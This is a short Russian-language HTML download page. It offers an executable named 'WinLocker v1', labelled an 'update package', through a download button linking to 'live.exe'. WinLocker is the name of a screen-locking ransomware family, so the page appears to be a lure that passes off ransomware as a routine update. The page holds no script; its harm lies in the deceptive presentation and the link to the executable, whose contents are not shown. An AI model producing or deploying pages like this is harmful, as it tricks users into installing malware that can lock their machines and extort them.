<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Загрузка файла</title>
    <style>
        * {
            box-sizing: border-box;
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
        }

        body {
            background-color: #f4f5f7;
            color: #333333;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .card {
            background-color: #ffffff;
            border: 1px solid #d1d5db;
            padding: 2rem;
            border-radius: 8px;
            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 380px;
            width: 90%;
        }

        .file-icon {
            font-size: 40px;
            margin-bottom: 1rem;
        }

        h1 {
            font-size: 1.25rem;
            margin-bottom: 0.5rem;
            font-weight: 600;
            color: #111827;
        }

        .file-size {
            font-size: 0.85rem;
            color: #6b7280;
            margin-bottom: 1.5rem;
        }

        .download-btn {
            display: inline-block;
            background-color: #2563eb;
            color: white;
            text-decoration: none;
            padding: 0.65rem 1.25rem;
            border-radius: 6px;
            font-weight: 500;
            font-size: 0.95rem;
            width: 100%;
            text-align: center;
            transition: background-color 0.2s;
            border: none;
            cursor: pointer;
        }

        .download-btn:hover {
            background-color: #1d4ed8;
        }
    </style>
</head>
<body>

    <div class="card">
        <div class="file-icon">📄</div>
        <h1>WinLocker v1</h1>
        <div class="file-size">Пакет обновления • Исполняемый файл</div>
        
        <a href="live.exe" class="download-btn" download>Скачать файл</a>
    </div>

</body>
</html>
